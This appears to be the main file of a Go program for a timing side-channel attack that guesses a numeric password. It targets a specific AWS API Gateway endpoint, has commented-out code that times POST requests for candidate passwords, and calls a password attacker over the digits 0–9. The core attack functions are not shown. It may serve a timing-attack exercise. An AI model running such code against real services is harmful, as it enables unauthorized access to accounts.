package main

const (
	targetServiceUrl = "https://qrxjmztf2h.execute-api.us-west-2.amazonaws.com/prod"

	minPwdLen = 11 // inclusive
	maxPwdLen = 14 // inclusive
)

func main() {

	// for i := 0; i < 10; i++ { // password length 11 - 14
	// 	for j := 10; j <= 15; j++ {
	// 		pwd := strings.Repeat(strconv.Itoa(i), j)
	// 		code, duration := makePostReq(pwd)
	// 		log.Printf("Password %s; Status %d; duration: %d", pwd, code, duration)
	// 	}
	// }

	// ctx, cancelFn := context.WithCancel(context.Background())
	// defer cancelFn()
	// pwd := "0"
	// att := NewAttempt(ctx, pwd, 10)
	// log.Printf("Password: %s; Average Duration: %d", pwd, att.GetDuration())

	attacker := NewPasswordAttacker("0123456789", maxPwdLen+3)
	attacker.Attack()
}
